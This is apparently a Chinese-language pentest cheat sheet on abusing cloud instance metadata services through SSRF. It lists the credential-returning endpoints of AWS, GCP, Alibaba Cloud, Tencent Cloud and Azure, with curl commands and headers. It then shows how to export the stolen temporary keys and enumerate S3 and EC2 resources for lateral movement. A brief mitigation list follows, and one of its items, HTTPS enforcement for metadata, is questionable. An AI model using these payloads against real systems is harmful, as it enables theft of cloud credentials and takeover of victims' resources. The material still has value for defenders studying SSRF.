# 云元数据攻击（Cloud Metadata）

## 原理
云服务器（ECS/EC2）内置元数据服务，可通过 SSRF 获取实例临时凭据

## 各云厂商元数据地址

### AWS
```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# IAM 角色凭据（核心！）
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/角色名

# 返回的临时凭据可直接使用：
# AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY / AWS_SESSION_TOKEN
```

### GCP
```bash
# GCP 元数据 API
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# 需要 Metadata-Flavor: Google 头
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

### 阿里云
```bash
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/user-data/

# STS 临时凭据
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/角色名
```

### 腾讯云
```bash
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/cvm/security-credentials/
```

### Azure
```bash
# IMDS 端点
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需要 Metadata:true 头
curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 托管身份凭据
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## 利用方式
```bash
# 1. 通过 SSRF 获取临时凭据
# 2. 使用凭据访问云服务
# 3. 横向移动到其他资源

# AWS 利用示例
export AWS_ACCESS_KEY_ID=xxx
export AWS_SECRET_ACCESS_KEY=xxx
export AWS_SESSION_TOKEN=xxx
aws s3 ls
aws ec2 describe-instances
```

## 保护
```
1. 限制 IAM 角色权限（最小权限原则）
2. 使用 IMDSv2（AWS，需要 PUT 请求获取 token）
3. 对 SSRF 漏洞进行严格过滤
4. 对元数据访问做 HTTPS 强制
5. 防止内部服务直接访问 169.254.169.254
```